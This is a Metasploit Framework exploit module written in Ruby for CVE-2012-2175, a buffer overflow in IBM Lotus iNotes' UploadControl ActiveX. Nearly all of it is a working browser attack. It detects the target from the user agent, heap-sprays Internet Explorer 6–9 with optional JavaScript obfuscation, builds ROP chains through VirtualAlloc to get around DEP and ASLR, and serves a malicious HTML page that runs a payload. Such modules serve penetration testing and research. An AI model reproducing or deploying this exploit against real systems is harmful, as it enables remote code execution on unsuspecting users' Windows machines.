##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::RopDb
	include Msf::Exploit::Remote::BrowserAutopwn

	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "9.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:rank       => Rank,
		:classid    => "{0F2AAAE3-7E9E-4b64-AB5D-1CA24C6ACB9C}",
		:method     => "Attachment_Times"
	})


	def initialize(info={})
		super(update_info(info,
			'Name'           => "IBM Lotus iNotes dwa85W ActiveX Buffer Overflow",
			'Description'    => %q{
					This module exploits a buffer overflow vulnerability on the UploadControl
				ActiveX. The vulnerability exists in the handling of the "Attachment_Times"
				property, due to the insecure usage of the _swscanf. The affected ActiveX is
				provided by the dwa85W.dll installed with the IBM Lotus iNotes ActiveX installer.

				This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7,
				using the dwa85W.dll 85.3.3.0 as installed with Lotus Domino 8.5.3.

				In order to bypass ASLR the no aslr compatible module dwabho.dll is used. This one
				is installed with the iNotes ActiveX.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Gaurav Baruah', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2012-2175'],
					[ 'OSVDB', '82755' ],
					[ 'BID', '53879' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-132/' ],
					[ 'URL', 'http://www-304.ibm.com/support/docview.wss?uid=swg21596862' ]
				],
			'Payload'        =>
				{
					'Space' => 978,
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'DefaultOptions'  =>
				{
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# dwa85W.dll 85.3.3.0
					[ 'Automatic', {} ],
					[ 'IE 6 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4', 'Ret' => 0x0c0c0c0c } ],
					[ 'IE 7 on Windows XP SP3', { 'Rop' => nil,     'Offset' => '0x5F4', 'Ret' => 0x0c0c0c0c } ],
					[ 'IE 8 on Windows XP SP3', { 'Rop' => :msvcrt, 'Offset' => '0x5f4', 'Ret' => 0x77C34FBF } ], # pop esp # ret # msvcrt.dll
					[ 'IE 7 on Windows Vista',  { 'Rop' => nil,     'Offset' => '0x5f4', 'Ret' => 0x0c0c0c0c } ],
					[ 'IE 8 on Windows Vista',  { 'Rop' => :notes,  'Offset' => '0x5f4', 'Ret' => 0x1000f765 } ], # pop eax # ret # dwabho.dll
					[ 'IE 8 on Windows 7',      { 'Rop' => :notes,  'Offset' => '0x5f4', 'Ret' => 0x1000f765 } ], # pop eax # ret # dwabho.dll
					[ 'IE 9 on Windows 7',      { 'Rop' => :notes,  'Offset' => '0x5fe', 'Ret' => 0x1000f765 } ]  # pop eax # ret # dwabho.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => "Jun 01 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
			], self.class)

	end

	def get_target(agent)
		#If the user is already specified by the user, we'll just use that
		return target if target.name != 'Automatic'

		nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
		ie = agent.scan(/MSIE (\d)/).flatten[0] || ''

		ie_name = "IE #{ie}"

		case nt
		when '5.1'
			os_name = 'Windows XP SP3'
		when '6.0'
			os_name = 'Windows Vista'
		when '6.1'
			os_name = 'Windows 7'
		end

		targets.each do |t|
			if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
				print_status("Target selected as: #{t.name}")
				return t
			end
		end

		return nil
	end

	def ie_heap_spray(my_target, p)
		js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
		js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))
		js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))

		# Land the payload at 0x0c0c0c0c
		case my_target
		when targets[7]
			# IE 9 on Windows 7
			js = %Q|
			function randomblock(blocksize)
			{
				var theblock = "";
				for (var i = 0; i < blocksize; i++)
				{
					theblock += Math.floor(Math.random()*90)+10;
				}
				return theblock;
			}

			function tounescape(block)
			{
				var blocklen = block.length;
				var unescapestr = "";
				for (var i = 0; i < blocklen-1; i=i+4)
				{
					unescapestr += "%u" + block.substring(i,i+4);
				}
				return unescapestr;
			}

			var heap_obj = new heapLib.ie(0x10000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_random_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset_length = #{my_target['Offset']};
			for (var i=0; i < 0x1000; i++) {
				var padding = unescape(tounescape(randomblock(0x1000)));
				while (padding.length < 0x1000) padding+= padding;
				var junk_offset = padding.substring(0, offset_length);
				var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);
				while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;
				sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);
				heap_obj.alloc(sprayblock);
			}
			|

		else
			# For IE 6, 7, 8
			js = %Q|
			var heap_obj = new heapLib.ie(0x20000);
			var code = unescape("#{js_code}");
			var nops = unescape("#{js_nops}");
			while (nops.length < 0x80000) nops += nops;
			var offset = nops.substring(0, #{my_target['Offset']});
			var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
			while (shellcode.length < 0x40000) shellcode += shellcode;
			var block = shellcode.substring(0, (0x80000-6)/2);
			heap_obj.gc();
			for (var i=1; i < 0x300; i++) {
				heap_obj.alloc(block);
			}
			var overflow = nops.substring(0, 10);
			|

		end

		js = heaplib(js, {:noobfu => true})

		if datastore['OBFUSCATE']
			js = ::Rex::Exploitation::JSObfu.new(js)
			js.obfuscate
		end

		return js
	end

	def get_payload(t, cli)
		code = payload.encoded

		# No rop. Just return the payload.
		return code if t['Rop'].nil?

		# Both ROP chains generated by mona.py - See corelan.be
		case t['Rop']
		when :msvcrt
			print_status("Using msvcrt ROP")
			rop_payload = generate_rop_payload('msvcrt', code, {'target'=>'xp'})#{'pivot'=>stack_pivot, 'target'=>'xp'})
		else
			print_status("Using dwabho.dll ROP")
			# gadgets from dwabho.dll, using mona.py
			rop_payload = [
				0x1000f765, # POP EAX # RETN
				0x1001a22c, # ptr to &VirtualAlloc() [IAT dwabho.dll]
				0x10010394, # JMP DWORD PTR DS:[EAX]
				0x0c0c0c2c, # ret after VirtualAlloc
				0x0c0c0c2c, # lpAddress
				0x00000400, # dwSize
				0x00001000, # flAllocationType
				0x00000040 # flProtect
			].pack("V*")
			rop_payload << code
		end

		return rop_payload
	end

	def load_exploit_html(my_target, cli)
		p  = get_payload(my_target, cli)
		js = ie_heap_spray(my_target, p)

		bof = rand_text_alpha(552) # offset to eip
		bof << [my_target.ret].pack("V")

		case my_target['Rop']
		when :msvcrt
			bof << rand_text_alpha(4)
			bof << [0x0c0c0c0c].pack("V") # new ESP
		when :notes
			bof << rand_text_alpha(4)
			bof << [0x0c0c0c00].pack("V") # eax
			bof << [0x1000f49a].pack("V") # pop esp # dec ecx # add byte ptr ds:[eax],al # pop ecx # pop ecx # retn # dwabho.dll
			bof << [0x0c0c0c04].pack("V") # new ESP
		end

		my_bof = Rex::Text.to_unescape(bof)

		html = %Q|
		<html>
		<head>
		<script>
		#{js}
		</script>
		</head>
		<body>
		<object id="UploadControl" width="100%" height="100%" classid="clsid:0F2AAAE3-7E9E-4b64-AB5D-1CA24C6ACB9C">
			<param name="General_Mode" value="1">
			<param name="General_URL" value="http://#{rand_text_alpha(rand(10) + 5)}">
		</object>
		<script>
			var bof = unescape("#{my_bof}");
			var my_time = "#{rand_text_numeric(2)}/#{rand_text_numeric(2)}/#{rand_text_numeric(4)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)} ";
			my_time += bof;
			my_time += " GMT";
			UploadControl.Attachment_Times = my_time;
		</script>
		</body>
		</html>
		|

		return html
	end

	def on_request_uri(cli, request)
		agent = request.headers['User-Agent']
		uri   = request.uri
		print_status("Requesting: #{uri}")

		my_target = get_target(agent)
		# Avoid the attack if no suitable target found
		if my_target.nil?
			print_error("Browser not supported, sending 404: #{agent}")
			send_not_found(cli)
			return
		end

		html = load_exploit_html(my_target, cli)
		html = html.gsub(/^\t\t/, '')
		print_status("Sending HTML...")
		send_response(cli, html, {'Content-Type'=>'text/html'})
	end

end